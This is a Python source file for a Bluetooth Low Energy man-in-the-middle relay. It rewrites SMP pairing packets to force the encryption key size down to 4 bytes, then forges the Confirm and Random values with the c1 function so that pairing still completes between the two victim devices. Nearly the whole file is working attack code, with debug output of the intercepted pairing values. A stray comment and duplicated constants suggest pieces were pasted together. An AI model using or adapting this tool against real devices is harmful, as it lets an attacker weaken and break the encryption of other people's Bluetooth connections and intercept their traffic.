# SPDX-License-Identifier: GPL-3.0-or-later
# smp_confirm_bridge.py — rewrite SMP Confirm/Random so pairing succeeds after key-size downgrade.
#
# Requires: PyCryptodome (pip install pycryptodome)
#
# Works for LE Legacy, Just Works (TK = 0…0). If you use Passkey/OOB, set TK accordingly.

from dataclasses import dataclass, field
from typing import Optional, Tuple
import os

try:
    from Crypto.Cipher import AES
except ImportError as e:
    raise SystemExit("PyCryptodome required: pip install pycryptodome") from e

# --- at top of mitble_help.py ---
DEBUG_MITM = True

def _hx(b: bytes) -> str:
    return ''.join(f'{x:02x}' for x in b)

# ---------- Low-level helpers (spec-accurate) ----------
def _aes_e(key16: bytes, block16: bytes) -> bytes:
    return AES.new(key16, AES.MODE_ECB).encrypt(block16)

def _c1(TK: bytes, r: bytes, preq7: bytes, pres7: bytes,
        iat: int, rat: int, ia6: bytes, ra6: bytes) -> bytes:
    """
    c1(k, r, preq, pres, iat, rat, ia, ra) = e(k, e(k, r XOR p1) XOR p2)
    preq/pres are the 7-byte SMP command bodies (starting at Code).
    iat/rat are 0=public,1=random. ia/ra are 6-byte addresses.
    Construction follows Core v5.x Vol 3, Part H, 2.2.3.  (p1, p2).
    """
    assert len(TK) == 16 and len(r) == 16 and len(preq7) == 7 and len(pres7) == 7
    assert len(ia6) == 6 and len(ra6) == 6
    iatp = bytes([iat & 1])   # 8-bit iat' with 7 zeros is just the LSB kept; rest zeros
    ratp = bytes([rat & 1])
    # p1 = pres || preq || rat' || iat'
    p1 = pres7 + preq7 + ratp + iatp
    # p2 = padding(4) || ia || ra
    p2 = b"\x00\x00\x00\x00" + ia6 + ra6
    return _aes_e(TK, bytes(x ^ y for x, y in zip(_aes_e(TK, bytes(x ^ y for x, y in zip(r, p1))), p2)))

def _rand16() -> bytes:
    return os.urandom(16)

# ---------- SMP/L2CAP parsing ----------
_SMP_CID = 0x0006
_SMP_CONFIRM = 0x03
_SMP_RANDOM  = 0x04
_SMP_PAIR_REQ = 0x01
_SMP_PAIR_RSP = 0x02

def _parse_ll_l2cap_smp(ll_body: bytes) -> Tuple[bool, int, bytes, int, bytes, int, bytes]:
    """
    Returns: (is_l2cap, l2len, l2hdr, cid, smp, smplen, smp_full)
      smp is the SMP payload (len==smplen), NOT including L2CAP hdr.
    On non-L2CAP/SMP, returns (False, 0, b'', 0, b'', 0, b'')
    """
    if len(ll_body) < 4:
        return (False, 0, b'', 0, b'', 0, b'')
    llid = ll_body[0] & 0x03
    length = ll_body[1]
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return (False, 0, b'', 0, b'', 0, b'')
    l2 = ll_body[2:2+length]
    l2len = l2[0] | (l2[1] << 8)
    cid   = l2[2] | (l2[3] << 8)
    if cid != _SMP_CID or len(l2) < 4 + l2len or l2len < 1:
        return (False, 0, b'', 0, b'', 0, b'')
    smp = l2[4:4+l2len]
    return (True, l2len, l2[:4], cid, smp, l2len, l2[:4] + smp)

def _rebuild_ll_with_smp(ll_body: bytes, new_smp: bytes) -> bytes:
    """Replace the SMP payload in an LL Data PDU while preserving lengths/headers."""
    llid = ll_body[0]
    length = ll_body[1]
    l2 = ll_body[2:2+length]
    # rebuild L2CAP (same length)
    new_l2 = l2[:4] + new_smp
    return bytes([llid, len(new_l2)]) + new_l2 + ll_body[2+length:]

# ---------- State we keep per receiver's perspective ----------
@dataclass
class ConfirmView:
    # preq/pres as SEEN BY THE RECEIVER (after your downgrade)
    preq7: Optional[bytes] = None
    pres7: Optional[bytes] = None
    iat: int = 0
    rat: int = 0
    ia6: bytes = b""
    ra6: bytes = b""
    # When we forge a confirm, we stash the matching r' to replay as Random.
    forged_r: Optional[bytes] = None

    def ready(self) -> bool:
        return self.preq7 is not None and self.pres7 is not None and len(self.ia6) == 6 and len(self.ra6) == 6

@dataclass
class BridgeState:
    # What the REAL CENTRAL (C) will compute when checking the PERIPHERAL peer
    to_central: ConfirmView = field(default_factory=ConfirmView)
    # What the REAL PERIPHERAL (P) will compute when checking the CENTRAL peer
    to_periph: ConfirmView  = field(default_factory=ConfirmView)
    # TK (16 bytes). For Just Works this is 16 zeroes.
    TK: bytes = b"\x00" * 16

    def set_addrs_for_central_view(self, ia6: bytes, iat: int, ra6: bytes, rat: int):
        self.to_central.ia6, self.to_central.iat = ia6, iat & 1
        self.to_central.ra6, self.to_central.rat = ra6, rat & 1

    def set_addrs_for_periph_view(self, ia6: bytes, iat: int, ra6: bytes, rat: int):
        self.to_periph.ia6, self.to_periph.iat = ia6, iat & 1
        self.to_periph.ra6, self.to_periph.rat = ra6, rat & 1

STATE = BridgeState()

# ---------- Public API you call from relay_master.py ----------

def note_pairing_pdu_for_receiver(ll_body: bytes, receiver_is_central: bool):
    ok, l2len, l2hdr, cid, smp, smplen, _ = _parse_ll_l2cap_smp(ll_body)
    if not ok or smplen < 7:
        return
    code = smp[0]
    if code not in (_SMP_PAIR_REQ, _SMP_PAIR_RSP):
        return

    view = STATE.to_central if receiver_is_central else STATE.to_periph
    if code == _SMP_PAIR_REQ:
        view.preq7 = smp[:7]
        if DEBUG_MITM:
            print(f"[STORE preq7 -> {'CENTRAL' if receiver_is_central else 'PERIPH '}] preq7={_hx(view.preq7)}")
            print(f"  addr_ctx: iat={view.iat} ia={_hx(view.ia6)} rat={view.rat} ra={_hx(view.ra6)}")
    elif code == _SMP_PAIR_RSP:
        view.pres7 = smp[:7]
        if DEBUG_MITM:
            print(f"[STORE pres7 -> {'CENTRAL' if receiver_is_central else 'PERIPH '}] pres7={_hx(view.pres7)}")
            print(f"  addr_ctx: iat={view.iat} ia={_hx(view.ia6)} rat={view.rat} ra={_hx(view.ra6)}")


def rewrite_confirm_random(ll_body: bytes, receiver_is_central: bool):
    ok, l2len, l2hdr, cid, smp, smplen, _ = _parse_ll_l2cap_smp(ll_body)
    if not ok or smplen not in (17,):  # 1 + 16
        return (ll_body, False, "")

    code = smp[0]
    view = STATE.to_central if receiver_is_central else STATE.to_periph
    side = "CENTRAL" if receiver_is_central else "PERIPH "

    if code == _SMP_CONFIRM:
        onwire_c = smp[1:17]
        if not view.ready():
            if DEBUG_MITM:
                print(f"[CONF->{side}] NOT READY | onwire_c={_hx(onwire_c)} "
                      f"preq7? {view.preq7 is not None} pres7? {view.pres7 is not None} "
                      f"addr_ctx ia={_hx(view.ia6)} iat={view.iat} ra={_hx(view.ra6)} rat={view.rat}")
            return (ll_body, False, "NOT_READY")

        # Forge r' and compute confirm' for the receiver’s inputs
        rprime = _rand16()
        cprime = _c1(STATE.TK, rprime, view.preq7[0:7], view.pres7[0:7],
                     view.iat, view.rat, view.ia6, view.ra6)

        if DEBUG_MITM:
            print(f"[CONF->{side}] onwire_c={_hx(onwire_c)}  TK={_hx(STATE.TK)}")
            print(f"  using preq7={_hx(view.preq7)} pres7={_hx(view.pres7)} "
                  f"iat={view.iat} ia={_hx(view.ia6)} rat={view.rat} ra={_hx(view.ra6)}")
            print(f"  r'={_hx(rprime)}  c1_local={_hx(cprime)}  (will SEND this confirm)")

        view.forged_r = rprime
        new_smp = bytes([_SMP_CONFIRM]) + cprime
        return (_rebuild_ll_with_smp(ll_body, new_smp), True, "FORGE_CONFIRM")

    if code == _SMP_RANDOM:
        onwire_r = smp[1:17]
        if view.forged_r is None:
            if DEBUG_MITM:
                print(f"[RAND->{side}] NO_STORED_R | onwire_r={_hx(onwire_r)}")
            return (ll_body, False, "NO_STORED_R")

        if DEBUG_MITM:
            # Recompute c1 with stored inputs to sanity-check
            c_check = _c1(STATE.TK, view.forged_r, view.preq7[0:7], view.pres7[0:7],
                          view.iat, view.rat, view.ia6, view.ra6)
            print(f"[RAND->{side}] onwire_r={_hx(onwire_r)}  stored_r'={_hx(view.forged_r)} "
                  f"(we will SEND stored_r')")
            print(f"  Sanity: c1(TK, r', ...)={_hx(c_check)} (should match the confirm we sent earlier)")

        new_smp = bytes([_SMP_RANDOM]) + view.forged_r
        view.forged_r = None
        return (_rebuild_ll_with_smp(ll_body, new_smp), True, "FORGE_RANDOM")

    return (ll_body, False, "")



# ...paste your code exactly as you posted...

# --- constants we use ---
_SMP_CID = 0x0006
_SMP_PAIRING_REQ = 0x01
_SMP_PAIRING_RSP = 0x02

def _rewrite_ll_l2cap_smp(ll_body: bytes, new_key_size: int = 0x04):
    """
    Input:  full LL 'body' (starts at LL header byte 0x..: LLID|NESN|SN|MD, then length, then payload)
    Output: (modified_ll_body: bytes, changed: bool)

    Rewrites SMP Pairing Req/Resp MaxEncryptionKeySize (1 byte) to new_key_size.
    Only triggers on: LLID=start-of-L2CAP, CID=0x0006, SMP Code in {0x01, 0x02}.
    """
    if len(ll_body) < 4:
        return ll_body, False

    llid = ll_body[0] & 0x03
    length = ll_body[1]
    # must have the whole payload present
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return ll_body, False

    # L2CAP header starts at offset 2
    l2cap = bytearray(ll_body[2:2+length])
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)

    # must be SMP CID and enough payload for Pairing Req/Rsp (len >= 7)
    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
        return ll_body, False

    smp = bytearray(l2cap[4:4+l2len])
    smp_code = smp[0]
    if smp_code not in (_SMP_PAIRING_REQ, _SMP_PAIRING_RSP):
        return ll_body, False

    # Byte 4 of SMP Pairing Req/Rsp is Max Encryption Key Size
    if smp[4] == new_key_size:
        return ll_body, False  # nothing to change

    smp[4] = new_key_size
    l2cap[4:4+l2len] = smp

    # Reassemble LL body: [hdr,len] + L2CAP(payload)
    new_ll = bytearray(ll_body)
    new_ll[2:2+length] = l2cap  # length unchanged
    return bytes(new_ll), True


def  downgrade_pairing_response(packet_bytes: bytes, new_key_size: int = 0x04):
    """
    Input:  'PACKET' message body from relay_slave -> relay_master:
            [event_le16][LL body ...]
    Output: (modified_packet_bytes, changed: bool)
    """
    if len(packet_bytes) < 4:
        return packet_bytes, False
    event = packet_bytes[:2]
    ll_body = packet_bytes[2:]
    ll_body2, changed = _rewrite_ll_l2cap_smp(ll_body, new_key_size)
    return (event + ll_body2), changed


def downgrade_pairing_request(ll_body: bytes, new_key_size: int = 0x04):
    """
    Input:  msg.body from SniffleHW (full LL body)
    Output: (modified_ll_body, changed: bool)
    """
    return _rewrite_ll_l2cap_smp(ll_body, new_key_size)

